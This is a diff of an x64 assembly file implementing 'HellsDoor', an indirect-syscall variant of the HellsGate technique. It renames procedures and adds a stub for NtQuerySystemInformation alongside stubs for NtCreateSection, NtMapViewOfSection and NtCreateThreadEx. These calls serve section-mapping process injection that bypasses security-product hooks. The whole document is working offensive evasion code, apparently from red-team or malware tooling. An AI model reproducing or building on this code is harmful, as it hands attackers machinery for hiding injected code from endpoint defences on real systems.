@@ -19,13 +19,13 @@
 
 	;; New implementation of HellsGate with indirect syscalls: HellsDoor
 
-	OpenDoor PROC
+	WhisperHell PROC
 		mov wSystemCall, 000h
 		mov wSystemCall, ecx
 		ret
-	OpenDoor ENDP
+	WhisperHell ENDP
 
-	GoToDoor PROC
+	GoToHell PROC
 		mov [rsp+8], rcx						; Save registers.
 		mov [rsp+16], rdx
 		mov [rsp+24], r8
@@ -44,33 +44,37 @@
 		mov r10, rcx
 		mov eax, wSystemCall					; Load SSN into EAX.
 		jmp r11									; Jump to -> Invoke system call.
-	GoToDoor ENDP
+	GoToHell ENDP
 
 	NtCreateSection PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtCreateSection ENDP
 
 	NtMapViewOfSection PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtMapViewOfSection ENDP
 
 	NtUnmapViewOfSection PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtUnmapViewOfSection ENDP
 
 	NtClose PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtClose ENDP
 
 	NtCreateThreadEx PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtCreateThreadEx ENDP
 	
 	NtWaitForSingleObject PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtWaitForSingleObject ENDP
 
+	NtQuerySystemInformation PROC
+		jmp GoToHell
+	NtQuerySystemInformation ENDP
+
 	NtDelayExecution PROC
-		jmp GoToDoor
+		jmp GoToHell
 	NtDelayExecution ENDP
-end
+end	
